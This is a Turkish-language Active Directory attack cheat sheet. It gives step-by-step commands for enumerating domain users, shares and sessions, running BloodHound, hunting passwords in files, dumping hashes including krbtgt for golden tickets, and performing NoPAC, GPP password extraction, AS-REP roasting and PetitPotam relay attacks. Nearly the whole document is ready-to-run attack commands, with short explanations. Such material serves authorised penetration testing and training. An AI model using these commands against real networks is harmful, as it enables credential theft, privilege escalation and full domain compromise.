# **Adım 1: AD Keşfi**
----------------------------------
#### Kullanıcı Keşfi
- **Nedir?**
  - Bu adımda, Active Directory'deki tüm kullanıcıları tespit edip, parola deneme saldırıları (password spray) veya diğer saldırılar için kullanılabilecek bir kullanıcı listesi oluşturmak istiyoruz.
- **Nasıl Yapılır?**

  - **Adım 1**
    - Tüm AD Kullanıcılarını Al

**Impacket**
```bash
impacket-getadusers -all -dc-ip <IP> 'domain/username:password'
```

**CME (CrackMapExec)**
```bash
crackmapexec smb X.X.X.X -u "username" -p "password" --users
```

  - **Adım 2**
    - E-postaları ayıklamak için AWK komutunu kullanın:
```bash
awk '{
  while (match($0, /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}/)) {
    print substr($0, RSTART, RLENGTH)
    $0 = substr($0, RSTART + RLENGTH)
  }
}' your_file.txt
```

  - **Adım 3**
    - Belirli bir e-posta uzantısını ayıklayın:
```bash
awk '{gsub(/@<SIRKET_ADI>\.com/, ""); print}' your_file.txt > output_file.txt
```

**Erişim Belirleme**
```bash
cme smb x.x.x.x -u -p (--local-auth) (eğer yerel yönetici yetkisi varsa)
```

**Tüm Paylaşımlara Erişim Bulma**
```bash
cme smb x.x.x.x -u -p --shares
```

**Kullanıcınızın WinRM Yetkisini Belirleyin**
```bash
crackmapexec winrm X.X.X.X -u -p
```

**Oturumlar**
```bash
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sessions
```

**Giriş Yapmış Kullanıcılar**
```bash
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --loggedon-users
```

**Diskler**
```bash
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --disks
```

**Gruplar**
```bash
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --groups
```

**Yerel Gruplar**
```bash
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --local-groups
```

**Parola Politikası**
```bash
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --pass-pol
```

#### BloodHound
- **Nedir?**
  - AD bilgilerini keşfederek potansiyel saldırı yolları sunar. Geçerli kimlik bilgileri gerektirir.
- **Nasıl Kullanılır?**
```bash
bloodhound-python -u user -p pass -ns X.X.X.X -d <domain> -c all
```

#### Dosya/Parola Avcılığı
- **Nedir?**
  - Ağ üzerinden uzaktan dosya aramak. Snaffler tercih edilir ancak masaüstü erişimi gerektirir.

**Nasıl Yapılır?**

**Manspider**
```bash
# Dosyalarda kelime bulma
manspider --threads 256 X.X.X.X/24 -u -p -c admin password

# Dosya isimlerini bulma
manspider --threads 256 X.X.X.X/24 -u -p -f admin password
```

**DonPAPI** (Yerel Yönetici Gerektirir)
```bash
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target
DonPAPI.py -k domain/user@target   # KERBEROS
DonPAPI.py -local_auth user@target # YEREL YÖNETİCİ
```

**Snaffler**
```bash
Seatbelt.exe -group=all -full > output.txt
Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1
```

----------------------------------
## Adım 2: Erişim Keşfi
----------------------------------

### Hash Dumping

**Kullanıcı Hash'i Alın**
```bash
secretsdump.py '<Domain>/<User>@<DC.IP>' -just-dc-user user1
```

**krbtgt Hash'i Alın (Golden Ticket)**
```bash
secretsdump.py '<Domain>/<User>@<DC.IP>' -just-dc-user krbtgt
```

**Yerel Yönetici ile Dumping**
```bash
secretsdump.py './<User>@<DC.IP>' -just-dc-user krbtgt
```

**DonPAPI ile Dumping**
```bash
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target
DonPAPI.py -k domain/user@target   # KERBEROS
DonPAPI.py -local_auth user@target # YEREL YÖNETİCİ
```

**NTLM Hashcat Modülü**
```bash
-m 1000
```

[Hashcat Rules Collection](https://github.com/n0kovo/hashcat-rules-collection)

----------------------------------
## Adım 3: AD Saldırıları
----------------------------------
#### NoPAC
- **Nedir?**
  - CVE-2021-42278 ve CVE-2021-42287 ile standart kullanıcıdan domain admin seviyesine çıkış sağlar.
- **Nasıl Yapılır?**
```bash
crackmapexec smb <Domain Controller> -u 'user' -p 'pass' -M nopac
```

#### GPP
- **Nedir?**
  - SYSVOL içinde eski politikalarla depolanan kimlik bilgilerini bulur.
- **Nasıl Yapılır?**
```bash
crackmapexec smb <Domain Controller> -u username -p pass -M gpp_autologin
crackmapexec smb X.X.X.X -u USER -p PASS -M gpp_password
impacket-Get-GPPPassword 'domain.local/USER:PASSWORD@X.X.X.X'
```

**Metasploit**
```bash
use auxiliary/scanner/smb/smb_enum_gpp
```

**Manuel**
```bash
smbclient \\\\DC-IP\\sysvol
mget *
crack - gpp-decrypt hash
```

#### ASREP Roasting
- **Nedir?**
  - Pre-authentication gerekmeyen kullanıcıların TGT'sini elde ederek offline olarak kırabilirsiniz.
- **Nasıl Yapılır?**
```bash
# CME
crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' --asreproast outfile.txt

# Impacket
impacket-GetNPUsers 'domain/' -usersfile otherusers.txt -format hashcat -outputfile asrep.txt -dc-ip X.X.X.X

# Hashcat Modülü
18200
```

#### PetitPotam
- **Nedir?**
  - ADCS + NTLM Relay saldırısıdır. SMB Signing devre dışıysa ve ADCS Web Enrollment açıksa çalışır.
- **Nasıl Yapılır?**
```bash
# CME
crackmapexec smb <Domain Controller> -u '' -p '' -M petitpotam
```

### Daha Fazlası için...
Diğer saldırıların detayları bu dokümanın ilerleyen bölümlerinde bulunmaktadır. AD ortamında keşif, zafiyet istismarı ve hak yükseltme tekniklerini öğrenmek için lütfen tüm dokümanı inceleyin.
